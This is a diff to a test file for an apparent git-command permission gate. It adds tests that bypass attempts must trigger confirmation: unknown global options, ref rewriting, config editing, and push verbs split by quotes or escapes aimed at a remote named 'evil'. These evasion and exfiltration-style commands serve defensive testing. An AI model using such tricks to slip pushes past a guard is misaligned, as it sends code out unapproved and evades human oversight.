@@ -344,7 +344,6 @@ test("re-pointing the base asks", () => {
 	]) {
 		assert.equal(action(cmd), "confirm", cmd);
 	}
-	assert.equal(action("git symbolic-ref HEAD"), "allow");
 });
 
 test("git calls that overrule config, and setup hidden behind global options, ask", () => {
@@ -384,4 +383,32 @@ test("the effective push URL must be the configured one", () => {
 	assert.equal(ask("git push origin feat/x", repo), "confirm", "pushInsteadOf rewrites this remote");
 	sh(repo, "config", "--unset", "url.https://evil/.pushInsteadOf");
 	assert.equal(ask("git push origin feat/x", repo), "allow");
+});
+
+test("an unknown git option before the subcommand asks; known ones do not", () => {
+	for (const cmd of [
+		"git --attr-source HEAD remote add evil https://x/r.git",
+		"git --shallow-file x remote add evil https://x/r.git",
+		"git --unknown push",
+		"git --unknown status",
+		"git -Csub status",
+	]) {
+		assert.equal(action(cmd), "confirm", cmd);
+	}
+	for (const cmd of ["git --no-pager status", "git -p log", "git --bare status", "git --no-optional-locks status", "git -C sub status", "git --git-dir=x status", "git --namespace n status"]) {
+		assert.equal(action(cmd), "allow", cmd);
+	}
+});
+
+test("rewriting refs and editing config by hand ask", () => {
+	for (const cmd of ["git update-ref --stdin", "git symbolic-ref HEAD refs/heads/x", "git symbolic-ref HEAD", "git config -e", "git config --edit", "git config --global --edit"]) {
+		assert.equal(action(cmd), "confirm", cmd);
+	}
+	assert.equal(action("git update-ref refs/heads/feat/x HEAD"), "allow");
+});
+
+test("a push whose verb is split by quotes or escapes asks", () => {
+	for (const cmd of ["git pu''sh evil feat/x", "git pu\\sh evil feat/x", "git \"pu\"sh evil feat/x", "git 'push' evil feat/x"]) {
+		assert.equal(action(cmd), "confirm", cmd);
+	}
 });
